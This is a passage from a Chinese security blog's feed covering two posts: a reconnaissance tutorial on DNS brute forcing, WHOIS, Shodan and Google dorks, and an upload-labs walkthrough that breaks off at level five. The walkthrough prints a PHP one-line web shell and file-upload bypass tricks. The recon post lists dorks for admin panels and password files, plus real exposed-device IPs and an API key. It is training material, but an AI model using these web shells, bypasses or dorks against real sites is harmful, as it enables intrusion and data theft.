</code></pre>
<h3 id="dns-字典爆破">DNS 字典爆破</h3>
<ul>
<li>如果DNS区域传输的思想无法使用的话，可以进行DNS字典爆破，这种方法也能进行主机记录收集。</li>
<li>使用一个常用的字典，里面含有一些主机记录的名称。大量主机名的字符串形成一个字典，使用这个字典，向DNS服务器发送字典式的暴力破解。比如有一万个主机记录的字典，对DNS进行爆破，如果DNS里面含有某个记录，则这个DNS会进行反馈对应的IP地址，反之DNS会反馈一个错误的结果。基于此，进行字典爆破，尝试把目标域的主机记录以及子域的域名记录爆破出来。</li>
<li>熟练掌握一个即可</li>
<li>以下是一些例子，本质上都是使用自带字典进行破解</li>
</ul>
<pre><code class="language-shell">• fierce -dnsserver 8.8.8.8 -dns sina.com.cn -wordlist a.txt 
# -dnsserver 8.8.8.8需要指定一个域名服务器，任意的DNS缓存服务器
# -dns sina.com.cn指定需要查询的域
# -wordlist a.txt指定当前目录下的字典
# 区域传输失败会尝试使用字典
dpkg -L fierce 
# 查看软件包相关联的软件包（可以查看自带字典位置） 
fierce --dns-servers 8.8.8.8  --domain sina.com.cn

• dnsdict6 -d4 -t 16 -x sina.com
# -d：显示IPv6的地址，-d4：显示IPv4的地址
# -t：指定线程数
# -D：指定字典
# -S：使用SRV服务进行猜解，服务资源记录，特殊的记录类型，资源记录标记
# -s，-m，-l，-x，-u：字典使用，小中大排列

• dnsenum -f dnsbig.txt -dnsserver 8.8.8.8 sina.com -o sina.xml
# -o：将执行结果导出成一个文件
# -f：会自己从自己的程序目录里面寻找字典，找不到的情况下需要自己自行指定目录

• dnsmap sina.com -w dns.txt


• dnsrecon -d sina.com --lifetime 10 -t brt -D dnsbig.txt 
# --lifetime 10：指定超时时间，如果查找这条记录超过了这个时间，则会被进行超时处理。
# -t brt：指定查找时使用字典。
# -D：指定字典的目录。
# -d：指定目标主机。

• dnsrecon -t std -d sina.com
# -t std：标准破解方式，也需要使用字典。
</code></pre>
<p>dnsdict6在 kali里面尚未安装，以下为安装方法</p>
<ul>
<li>dnsdict6：https://src.fedoraproject.org/lookaside/pkgs/thc-ipv6/thc-ipv6-2.7.tar.gz/2975dd54be35b68c140eb2a6b8ef5e59/thc-ipv6-2.7.tar.gz</li>
</ul>
<pre><code class="language-shell">![QQ截图20210417134341](C:\Users\DELL\Desktop\QQ截图20210417134341.png)tar -zxvf thc-ipv6-2.7.tar.gz

cd thc-ipv6-2.7/

apt-get install -y libpcap-dev libssl-dev

make 

cp dnsdict6 /usr/bin/

dnsdict6
</code></pre>
<h3 id="dns-注册信息">DNS 注册信息</h3>
<ul>
<li>在注册DNS时，有DNS注册信息，有的人在注册时会留下姓名，IP，电话，邮箱，公司地址等等，可以做一些社会工程学，物理攻击等等。</li>
<li>Whois查询：按不同地区有不同的whois</li>
<li>InterNic，是世界上最早的对IP地址进行分配的一个机构，只有分配后才能使用IP地址。之后又有不同地区之间的Nic。</li>
<li><img src="https://gitee.com/qu-xiaolei001/pic/raw/master/20210417134420.png" alt="" loading="lazy"></li>
<li>Kali下有自带Whois，他也是通过链接列表里的工具进行查询，来返回一个结果。</li>
</ul>
<pre><code>whois -h whois.apnic.net 192.0.43.10
</code></pre>
<p>Web接口查询：</p>
<ul>
<li><a href="https://whois.aliyun.com/">https://whois.aliyun.com/</a></li>
<li><a href="https://www.whois365.com/cn/">https://www.whois365.com/cn/</a></li>
<li><a href="http://whois.chinaz.com/">http://whois.chinaz.com/</a></li>
<li><a href="https://whois.aizhan.com/">https://whois.aizhan.com/</a></li>
</ul>
<h2 id="3-搜索引擎">3. 搜索引擎</h2>
<h3 id="shodan">shodan</h3>
<ul>
<li>会对互联网上面的设备进行查询爬取，通过此，使用各种爬虫技术，获取获取服务器的banner信息，如果是http的头，就会识别http信息，如果是ftp就识别ftp信息，不管目标使用的是标准端口还是非标准端口，shodan都会爬取出来。未来的发展趋势物联网是其中的一项，比如现在的冰箱，扫地机器人，空调等等。而且物联网设备安全性能差，一般使用的是默认的账号密码，存在弱口令问题，也可以直接在官网中查询默认密码，登录此设备进一步进行渗透。</li>
<li>在之前的DNS域名查询中，假如已经查询到了该目标域名所对应的域名子域，以及相应的IP，就可以拿取这些IP在shodan上面去进行查询，看该目标是否已被shodan爬取，还可以看看该c位网段下是否存在去其他主机，代替我们去扫描这个系统。</li>
</ul>
<ol>
<li>浏览器
<ul>
<li>net:211.144.145.0/24：如果已知目标网站的ip地址，现在要查询与这个IP地址在一个c段的所有的主机都开放了哪些端口，能够查看该网段下的IP。</li>
<li>country:&amp;&amp;city:过滤country:CN{net:202.207.177.3  country:CN city:beijing}，爬取到的中国北京的设备</li>
<li>port:查看开放端口：{country:CN city:beijing port:22}查看中国北京开放22端口的设备。除了标准端口，还可以进行非标准端口的爬取。</li>
<li>os:查看IP下的操作系统{os:windows}</li>
<li>hostname:保证目标是百度这家公司的服务器或设备{hostname:baidu.com}(主机或域名)</li>
<li>server:搜索服务，apache等等</li>
<li>搜索摄像头命令：webcam</li>
<li>搜索开放指定端口的服务器：port：XXX</li>
<li>搜索指定的IP地址信息：host：XXX.XXX.XXX.XXX</li>
<li>搜索具体城市开放的具体端口的一些设备：city：XXXXX port：XXX</li>
<li>https://www.shodan.io/explore查看帮助信息</li>
</ul>
</li>
</ol>
<pre><code>200 OK cisco country:JP
# 200 ok 访问成功，日本的cisco设备

user:admin pass:password

http://1.179.177.109:81/index.htm

linux ipnp avtech

http://75.69.59.49:8000
</code></pre>
<ol start="2">
<li>命令行
<ul>
<li>kali安装Shodan命令行：easy_install shodan</li>
<li>Shodan初始化：shodan init [API Key]
<ul>
<li>初始化Shodan就是给Shodan初始化API Key。[API Key：hHg9HmLgZuqBc1VsNqWGd10ilpyveeesb].这个API Key在自己登陆Shodan页面之后的右上角。</li>
</ul>
</li>
<li>查看具体服务count
<ul>
<li>shodan count Apache(可以查询开放了Apache服务在Shodan中的具体数量)</li>
<li>shodan count Tomcat</li>
</ul>
</li>
<li>Shodan命令行搜索功能
<ul>
<li>利用 shodan search microsoft iis 6.0</li>
</ul>
</li>
<li>Shodan获取指定IP地址信息
<ul>
<li>shodan host [ip地址]</li>
</ul>
</li>
<li>Shodan获取自己shodan账号信息（会员）
<ul>
<li>shodan info</li>
</ul>
</li>
<li>Shodan获取自身外部可见IP地址
<ul>
<li>shodan myip</li>
</ul>
</li>
<li>Shodan检测是否有蜜罐保护
<ul>
<li>shodan honeyscore [目标IP]</li>
</ul>
</li>
<li>python-shodan（使用python引入shodan）</li>
</ul>
</li>
</ol>
<h3 id="google">google</h3>
<ul>
<li>综合性搜索浏览器，搜索网页，设备等等。</li>
<li>Google hacking数据库：https://www.exploit-db.com/google-hacking-database/<br>
例如：查询Access数据：filetype:mdb &quot;standard jet&quot;(password | username | user pass)</li>
</ul>
<h4 id="1-google搜索基本符号的意义">1. google搜索基本符号的意义</h4>
<ol>
<li>【&quot;&quot;】完全匹配搜索。
<ul>
<li>用双引号括起来的内容会完全精确搜索，不会拆分关键词。</li>
<li><img src="https://gitee.com/qu-xiaolei001/pic/raw/master/20210417224245.png" alt="" loading="lazy"></li>
<li><img src="https://gitee.com/qu-xiaolei001/pic/raw/master/20210417224259.png" alt="" loading="lazy"></li>
</ul>
</li>
<li>【+】指定一个一定存在的一个关键词。
<ul>
<li>搜索的每条结果都有百科两个字。</li>
<li><img src="https://gitee.com/qu-xiaolei001/pic/raw/master/20210417224337.png" alt="" loading="lazy"></li>
</ul>
</li>
<li>【-】与+号相反，指定一个一定不存在的关键词。
<ul>
<li><img src="https://gitee.com/qu-xiaolei001/pic/raw/master/20210417224353.png" alt="" loading="lazy"></li>
</ul>
</li>
<li>【|】或条件。
<ul>
<li>搜索的两个词组，只要满足一个条件都会显示出来。</li>
<li><img src="https://gitee.com/qu-xiaolei001/pic/raw/master/20210418161129.png" alt="" loading="lazy"></li>
</ul>
</li>
<li>【AND】且条件。
<ul>
<li>搜索的两个词组必须都满足才能把结果显示出来。</li>
<li><img src="https://gitee.com/qu-xiaolei001/pic/raw/master/20210418161126.png" alt="" loading="lazy"></li>
</ul>
</li>
</ol>
<h4 id="2-site搜索语法">2. site搜索语法</h4>
<ol>
<li>作用：
<ol>
<li>可以针对目标做一次准确的信息搜集（目录，文件），搜索目标站点</li>
<li>可以得到目标的子域名</li>
<li>指定国家（cn：中国，fr：法国）</li>
</ol>
</li>
<li>site：搜索指定域名下的结果
<ol>
<li>site:baidu.com</li>
<li><img src="https://gitee.com/qu-xiaolei001/pic/raw/master/20210418161119.png" alt="" loading="lazy"></li>
</ol>
</li>
<li>拓展：site:baidu.com&amp;site:www.baidu.com(哪种方式搜索的结果多？)
<ol>
<li>site:www.baidu.com</li>
<li><img src="https://gitee.com/qu-xiaolei001/pic/raw/master/20210418161116.png" alt="" loading="lazy"></li>
</ol>
</li>
</ol>
<h4 id="3-inurl搜索语法">3. inurl搜索语法</h4>
<ol>
<li>作用：一般用于批量搜索较多，比如批量找后台，批量找注入点，批量找指定漏洞目标站点等等。</li>
<li>inurl:baidu.com
<ol>
<li>表示搜索结果的url中一定含有baidu.com这个关键词。</li>
<li><img src="https://gitee.com/qu-xiaolei001/pic/raw/master/20210418161040.png" alt="" loading="lazy"></li>
</ol>
</li>
<li>常用后台路径：
<ol>
<li>Admin/</li>
<li>System/login.php</li>
<li>Manage/</li>
<li>等等···</li>
<li><img src="https://gitee.com/qu-xiaolei001/pic/raw/master/20210418161030.png" alt="" loading="lazy"></li>
<li><img src="https://gitee.com/qu-xiaolei001/pic/raw/master/20210418161014.png" alt="" loading="lazy"></li>
</ol>
</li>
<li>批量找注入点：
<ol>
<li>inurl:php?id=</li>
<li><img src="https://gitee.com/qu-xiaolei001/pic/raw/master/20210418161007.png" alt="" loading="lazy"></li>
</ol>
</li>
</ol>
<h4 id="4-intitleintext搜索语法">4. intitle，intext搜索语法</h4>
<ol>
<li>作用：批量搜索漏洞后台，批量搜索寻找弱点网站（需要自己构造标题），针对性寻找页面。
<ul>
<li>可以搜索标题为指定内容的结果。</li>
<li>intitle是在标题里面，intext是在正文里面</li>
</ul>
</li>
<li>intitle:后台管理
<ol>
<li><img src="https://gitee.com/qu-xiaolei001/pic/raw/master/20210418160958.png" alt="" loading="lazy"></li>
<li><img src="https://gitee.com/qu-xiaolei001/pic/raw/master/20210418160954.png" alt="" loading="lazy"></li>
</ol>
</li>
<li>搜索思路多样化，使用不同的关键词，达到一样的效果
<ul>
<li>intitle:后台管理</li>
<li>intitle:后台管理系统</li>
<li>intitle:管理员登录</li>
<li>intitle:欢迎来到管理中心</li>
</ul>
</li>
<li>命令组合使用
<ul>
<li>intitle:登录 inurl:admin</li>
<li><img src="https://gitee.com/qu-xiaolei001/pic/raw/master/20210418160950.png" alt="" loading="lazy"></li>
</ul>
</li>
</ol>
<h4 id="5-cache搜索语法">5. cache:搜索语法</h4>
<ol>
<li>作用：类似于百度的快照功能，如果网页出现异常打不开，那麽使用这个语法就可以恢复到出现异常前的一个正常的状态。可以查看之前的内容，包括已经删掉的内容。</li>
<li>cache:内容。
<ol>
<li><img src="https://gitee.com/qu-xiaolei001/pic/raw/master/20210418160943.png" alt="" loading="lazy"></li>
<li><img src="https://gitee.com/qu-xiaolei001/pic/raw/master/20210418160937.png" alt="" loading="lazy"></li>
</ol>
</li>
<li>用途：寻找物理路径时，网站异常被恢复时可以使用这个语法来进行搜索。查看网站被删除信息时，也可以使用这个语法来搜索。</li>
<li>注意：搜索语法使用时，百度和谷歌都可以试一试，因为每个搜索引擎的收录结果都不一样。</li>
</ol>
<h4 id="6-filetype搜索语法">6. filetype搜索语法</h4>
<ol>
<li>搜索一个文件，指定文件类型</li>
<li>举例：SOX filetype:PDF
<ul>
<li>带有SOX关键字的文档，PDF格式</li>
</ul>
</li>
</ol>
<h4 id="7-google-hack拓展">7. Google Hack拓展</h4>
<ol>
<li>寻找管理员用户
<ol>
<li>www.71tv.net.cn</li>
<li>site:71tv.net.cn &quot;发布人&quot;
<ol>
<li>一般这种发布人都是后台用户，后台发布新闻时根据管理用户名来发布。</li>
</ol>
</li>
</ol>
</li>
<li>寻找目标脚本语言
<ol>
<li>很多伪静态网站，我们可以通过Google Hack来找到真实的脚本语言。</li>
<li>www.csc.com.tw
<ol>
<li>site:www.csc.com.tw php</li>
<li><img src="https://gitee.com/qu-xiaolei001/pic/raw/master/20210418160929.png" alt="" loading="lazy"></li>
</ol>
</li>
</ol>
</li>
<li>寻找c段主机，站点等
<ol>
<li>site:49.122.21.249:84/Admin/ZhiDao.aspx</li>
<li><img src="https://gitee.com/qu-xiaolei001/pic/raw/master/20210418160919.png" alt="" loading="lazy"></li>
</ol>
</li>
<li>支付页面
<ul>
<li>法国：payment site:fr</li>
<li>中国：payment site:cn</li>
</ul>
</li>
<li>搜索摄像头
<ul>
<li>intitle:&quot;netbotz appliance&quot; &quot;OK&quot;</li>
</ul>
</li>
<li>另外实例</li>
</ol>
<pre><code>• inurl:&quot;level/15/exec/-/show&quot; 
• intitle:&quot;netbotz appliance&quot; &quot;ok&quot; 
• inurl /admin/login.php 
• inurl:qq.txt 
• filetype:xls &quot;username | password“ 
• inurl:ftp &quot;password&quot; filetype:xls site:baidu.com 
• inurl:Service.pwd 

# 参考指令： 
• http://exploit-db.com/google-dorks
</code></pre>
<h3 id="其他搜索工具">其他搜索工具</h3>
<h4 id="yandex">YANDEX</h4>
<ul>
<li>世界第四大搜索引擎——俄罗斯</li>
<li>https://yandex.com/</li>
</ul>
<h4 id="kali-theharvester">KALI-theHarvester</h4>
<h4 id="kali-metagoofil">KALI-metagoofil</h4>
<h2 id="4-maltego">4. maltego</h2>
<ul>
<li>kali自动集成的十大安全工具之一，专门与KALI定制的版本，综合性信息收集软件，为数不多的用户体验比较好的软件之一，全图形化界面，首次进入需要申请账户注册登录。</li>
</ul>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[# upload-labs]]></title>
        <id>https://kite-007.github.io/upload-labsshang/</id>
        <link href="https://kite-007.github.io/upload-labsshang/">
        </link>
        <updated>2021-04-06T01:51:08.000Z</updated>
        <content type="html"><![CDATA[<p><ul class="markdownIt-TOC">
<li>
<ul>
<li><a href="#pass-1-%E5%89%8D%E7%AB%AFjs%E7%BB%95%E8%BF%87">Pass-1-前端js绕过</a></li>
</ul>
</li>
<li><a href="#pass-2-content-type%E7%BB%95%E8%BF%87">Pass-2-Content-type绕过</a></li>
<li><a href="#pass-3-%E9%83%A8%E5%88%86%E9%BB%91%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87">Pass-3-部分黑名单绕过</a></li>
<li><a href="#pass-4-htaccess%E7%BB%95%E8%BF%87">Pass-4-.htaccess绕过</a></li>
<li><a href="#pass-5-userini%E7%BB%95%E8%BF%87%E7%A9%BA%E6%A0%BC%E7%BB%95%E8%BF%87">Pass-5-.user.ini绕过+.空格.绕过</a></li>
<li><a href="#pass-6-%E5%A4%A7%E5%B0%8F%E5%86%99%E7%BB%95%E8%BF%87">Pass-6-大小写绕过</a></li>
<li><a href="#pass-7-%E7%A9%BA%E6%A0%BC%E7%BB%95%E8%BF%87">Pass-7-空格绕过</a></li>
<li><a href="#pass-8-%E7%82%B9%E7%BB%95%E8%BF%87">Pass-8-点绕过</a></li>
<li><a href="#pass-9-data%E7%BB%95%E8%BF%87">Pass-9-::$DATA绕过</a></li>
<li><a href="#pass-10-%E7%82%B9%E7%A9%BA%E6%A0%BC%E7%82%B9%E7%BB%95%E8%BF%87">Pass-10-点+空格+点绕过</a></li>
<li><a href="#pass-11-%E5%8F%8C%E5%86%99%E7%BB%95%E8%BF%87">Pass-11-双写绕过</a></li>
<li><a href="#pass-12-get%E5%9E%8B00%E6%88%AA%E6%96%AD%E7%BB%95%E8%BF%87">Pass-12-GET型00截断绕过</a></li>
<li><a href="#pass-13-post%E5%9E%8B00%E6%88%AA%E6%96%AD%E7%BB%95%E8%BF%87">Pass-13-POST型00截断绕过</a></li>
<li><a href="#pass-14-%E5%9B%BE%E7%89%87%E9%A9%AC%E7%BB%95%E8%BF%87">Pass-14-图片马绕过</a></li>
<li><a href="#pass-15-getimagesize-%E5%9B%BE%E7%89%87%E9%A9%AC%E7%BB%95%E8%BF%87">Pass-15-getimagesize()-图片马绕过</a></li>
<li><a href="#pass-16-exif_imagetype-%E5%9B%BE%E7%89%87%E9%A9%AC%E7%BB%95%E8%BF%87">Pass-16-exif_imagetype()-图片马绕过</a></li>
<li><a href="#pass-17-%E4%BA%8C%E6%AC%A1%E6%B8%B2%E6%9F%93%E7%BB%95%E8%BF%87">Pass-17-二次渲染绕过</a></li>
<li><a href="#pass-18-%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89%E7%BB%95%E8%BF%87">Pass-18-条件竞争绕过</a></li>
<li><a href="#pass-19-%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89apache%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%E7%BB%95%E8%BF%87">Pass-19-条件竞争&amp;Apache文件解析漏洞绕过</a></li>
<li><a href="#pass-20-post%E5%9E%8B00%E6%88%AA%E6%96%AD%E7%BB%95%E8%BF%87%E6%9C%AB%E5%B0%BE%E7%BB%95%E8%BF%87-%E7%A9%BA%E6%A0%BC%E7%BB%95%E8%BF%87">Pass-20-POST型00截断绕过+末尾/.绕过+. 空格绕过</a></li>
<li><a href="#pass-21-%E6%95%B0%E7%BB%84%E7%BB%95%E8%BF%87">Pass-21-数组+/绕过</a></li>
</ul>
(upload-labs)</p>
<ul>
<li>upload-labs部分关卡对php版本要求严格，推荐直接使用5.2.17nts</li>
<li>上传一个一句话小马，之后使用蚁剑连接。</li>
</ul>
<pre><code class="language-php">&lt;?php @eval($_POST['shell']); ?&gt;
</code></pre>
<h2 id="pass-1-前端js绕过">Pass-1-前端js绕过</h2>
<ul>
<li>代码：</li>
</ul>
<pre><code class="language-javascript">function checkFile() {
    var file = document.getElementsByName('upload_file')[0].value;
    if (file == null || file == &quot;&quot;) {
        alert(&quot;请选择要上传的文件!&quot;);
        return false;
    }
    //定义允许上传的文件类型
    var allow_ext = &quot;.jpg|.png|.gif&quot;;
    //提取上传文件的类型
    var ext_name = file.substring(file.lastIndexOf(&quot;.&quot;));
    //判断上传文件类型是否允许上传
    if (allow_ext.indexOf(ext_name + &quot;|&quot;) == -1) {
        var errMsg = &quot;该文件不允许上传，请上传&quot; + allow_ext + &quot;类型的文件,当前文件类型为：&quot; + ext_name;
        alert(errMsg);
        return false;
    }
}
</code></pre>
<ul>
<li>
<p>getElementsByName()：</p>
</li>
<li>
<p>lastIndexOf()：</p>
</li>
<li>
<p>substring()：</p>
</li>
<li>
<p>indexOf()：</p>
</li>
<li>
<p>因为是前端js校验，因此可以直接禁用js，或者用burp抓包修改文件类型。</p>
</li>
</ul>
<ol>
<li>方法一：绕过判断函数，先删再传
<ul>
<li><img src="https://kite-007.github.io/post-images/1617718963784.png" alt="" loading="lazy"></li>
</ul>
</li>
<li>方法二：禁用js
<ul>
<li><img src="https://kite-007.github.io/post-images/1617718888097.png" alt="" loading="lazy"></li>
</ul>
</li>
<li>方法三：burp抓包
<ul>
<li>先将文件格式改为上传所指定的白名单里的格式，再使用burp抓包，该格式为php。</li>
<li><img src="https://kite-007.github.io/post-images/1617719124188.png" alt="" loading="lazy"></li>
</ul>
</li>
<li>方法四：更改前端代码
<ul>
<li><img src="https://kite-007.github.io/post-images/1617719359791.png" alt="" loading="lazy"></li>
</ul>
</li>
<li>皆验证连接成功。
<ul>
<li><img src="https://kite-007.github.io/post-images/1617752416051.png" alt="" loading="lazy"></li>
</ul>
</li>
</ol>
<h1 id="pass-2-content-type绕过">Pass-2-Content-type绕过</h1>
<ul>
<li>代码</li>
</ul>
<pre><code class="language-javascript">$is_upload = false;
$msg = null;
if (isset($_POST['submit'])) {
    if (file_exists(UPLOAD_PATH)) {
        if (($_FILES['upload_file']['type'] == 'image/jpeg') || ($_FILES['upload_file']['type'] == 'image/png') || ($_FILES['upload_file']['type'] == 'image/gif')) {
            $temp_file = $_FILES['upload_file']['tmp_name'];
            $img_path = UPLOAD_PATH . '/' . $_FILES['upload_file']['name']            
            if (move_uploaded_file($temp_file, $img_path)) {
                $is_upload = true;
            } else {
                $msg = '上传出错！';
            }
        } else {
            $msg = '文件类型不正确，请重新上传！';
        }
    } else {
        $msg = UPLOAD_PATH.'文件夹不存在,请手工创建！';
    }
}
</code></pre>
<ul>
<li>
<p>黑名单过滤的文件类型是指HTTP头中content-type，这里的仅仅只判断了content-type的类型，所以将上传的文件通过抓包将文件的content-type更改为图片类型：image/jpeg、image/png、image/gif。</p>
</li>
<li>
<p>content-type：也叫做互联网媒体类型（Internet Media Type）或者叫MIME类型，在HTTP头中，用来显示具体请求中的媒体信息。</p>
</li>
<li>
<p>application/octet-stream表示二进制流，不知道文件类型。</p>
</li>
<li>
<p>application/json代表JSON类型。</p>
</li>
<li>
<p>方法：</p>
<ul>
<li><img src="https://kite-007.github.io/post-images/1617752781854.png" alt="" loading="lazy"></li>
<li><img src="https://kite-007.github.io/post-images/1617752787789.png" alt="" loading="lazy"></li>
</ul>
</li>
</ul>
<h1 id="pass-3-部分黑名单绕过">Pass-3-部分黑名单绕过</h1>
<ul>
<li>代码</li>
</ul>
<pre><code class="language-javascript">$is_upload = false;
$msg = null;
if (isset($_POST['submit'])) {
    if (file_exists(UPLOAD_PATH)) {
        $deny_ext = array('.asp','.aspx','.php','.jsp');
        $file_name = trim($_FILES['upload_file']['name']);
        $file_name = deldot($file_name);//删除文件名末尾的点
        $file_ext = strrchr($file_name, '.');
        $file_ext = strtolower($file_ext); //转换为小写
        $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA
        $file_ext = trim($file_ext); //收尾去空

        if(!in_array($file_ext, $deny_ext)) {
            $temp_file = $_FILES['upload_file']['tmp_name'];
            $img_path = UPLOAD_PATH.'/'.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext;            
            if (move_uploaded_file($temp_file,$img_path)) {
                 $is_upload = true;
            } else {
                $msg = '上传出错！';
            }
        } else {
            $msg = '不允许上传.asp,.aspx,.php,.jsp后缀文件！';
        }
    } else {
        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
    }
}
</code></pre>
<ul>
<li>黑名单中存在.asp,.aspx,.php,.jsp后缀文件，这些文件不允许被上传。</li>
<li>但可以上传.phtml .phps .php5 .pht这类畸形后缀名格式。</li>
<li>前提是apache的httpd.conf中有如下配置代码，如果没有就添加。</li>
</ul>
<pre><code>\\phpstudy_pro\Extensions\Apache2.4.39\conf\httpd.conf
AddType application/x-httpd-php .php .phtml .phps .php5 .pht
</code></pre>
<ul>
<li>方法：
<ul>
<li><img src="https://kite-007.github.io/post-images/1617753361041.png" alt="" loading="lazy"></li>
</ul>
</li>
</ul>
<h1 id="pass-4-htaccess绕过">Pass-4-.htaccess绕过</h1>
<ul>
<li>代码</li>
</ul>
<pre><code class="language-javascript">$is_upload = false;
$msg = null;
if (isset($_POST['submit'])) {
    if (file_exists(UPLOAD_PATH)) {
        $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.php1&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.pHp1&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.ini&quot;);
        $file_name = trim($_FILES['upload_file']['name']);
        $file_name = deldot($file_name);//删除文件名末尾的点
        $file_ext = strrchr($file_name, '.');
        $file_ext = strtolower($file_ext); //转换为小写
        $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA
        $file_ext = trim($file_ext); //收尾去空

        if (!in_array($file_ext, $deny_ext)) {
            $temp_file = $_FILES['upload_file']['tmp_name'];
            $img_path = UPLOAD_PATH.'/'.$file_name;
            if (move_uploaded_file($temp_file, $img_path)) {
                $is_upload = true;
            } else {
                $msg = '上传出错！';
            }
        } else {
            $msg = '此文件不允许上传!';
        }
    } else {
        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
    }
}
</code></pre>
<ul>
<li>除了.htaccess以外，所有的有问题的后缀名都被黑名单过滤掉了。</li>
<li>所以先上传一个.htaccess文件，使所有的文件都会被当作php去解析。</li>
<li>前提条件（1.mod_rewrite模块开启，2.AllowOverride All）。</li>
</ul>
<pre><code>SetHandler application/x-httpd-php 
</code></pre>
<ul>
<li>方法：
<ul>
<li><img src="https://kite-007.github.io/post-images/1617754089017.png" alt="" loading="lazy"></li>
<li>之后再上传一个任意的图片格式的文件。</li>
<li>如果要使用蚁剑连接，还需用burp抓包将文件格式改为(.php)</li>
</ul>
</li>
</ul>
<h1 id="pass-5-userini绕过空格绕过">Pass-5-.user.ini绕过+.空格.绕过</h1>
<ul>
<li>代码</li>
</ul>
<pre><code class="language-javascript">$is_upload = false;
$msg = null;
if (isset($_POST['submit'])) {
    if (file_exists(UPLOAD_PATH)) {
        $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;);
        $file_name = trim($_FILES['upload_file']['name']);
        $file_name = deldot($file_name);//删除文件名末尾的点
        $file_ext = strrchr($file_name, '.');
        $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA
        $file_ext = trim($file_ext); //首尾去空

        if (!in_array($file_ext, $deny_ext)) {
            $temp_file = $_FILES['upload_file']['tmp_name'];
            $img_path = UPLOAD_PATH.'/'.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext;
            if (move_uploaded_file($temp_file, $img_path)) {
                $is_upload = true;
            } else {
                $msg = '上传出错！';
            }
        } else {
            $msg = '此文件类型不允许上传！';
        }
    } else {
        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
    }
}
</code></pre>
<ul>
<li>提示：上传文件中存在readme.php。</li>
<li>我们先随便上传一个文件，复制其路径，再把文件名改为readme.php访问一下，看有什么内容，发现就是一段文字，并没有给我们更多的信息。</li>
<li>php中有一个默认配置文件php.ini，其中包括了很多php的配置，而自 PHP 5.3.0 起，PHP 支持基于每个目录的 INI 文件配置。</li>
<li>此类文件 仅被 CGI／FastCGI SAPI 处理。此功能使得 PECL 的 htscanner 扩展作废。如果你的 PHP 以模块化运行在 Apache 里，则用 .htaccess 文件有同样效果。</li>
<li>.user.ini就是一个支持用户“自定义”的配置文件，作用于所在的文件目录，及其子目录。在php工作时，会自下而上的检查配置文件，直到网站的根目录。</li>
<li>在它支持自定义的配置模式中，有两个比较有意思的配置选项,auto_append_file和auto_prepend_file,这两个选项起到了文件包含的作用，类似于调用了一个require函数。auto_prepend_file指定在主文件前自动解析文件的名称；auto_append_file指定在主文件后自动解析文件的名称，如果主文件以exit()结尾的话，则不会进行自动追加。</li>
<li>因此我们可以通过上传.user.ini配置文件，使其上传文件夹中的php文件能够自动包含某个文件。</li>
<li>我们先上传一个.user.ini文件，内容如下,表示该目录及其子目录下所有的php文件在执行时，自动在头部包含一个5.jpg文件。</li>
</ul>
<pre><code>auto_prepend_file=shell.jpg
</code></pre>
<ul>
<li>然后我们再上传一个文件内容为一句话木马的5.jpg文件。这时，我们去访问readme.php文件，并在参数中写入一个phpinfo();，却失败了。于是我更换了php版本，我使用的是phpstudy环境，我将版本切换为php-5.4.45-nts后，成功的查看到了phpinfo的信息。</li>
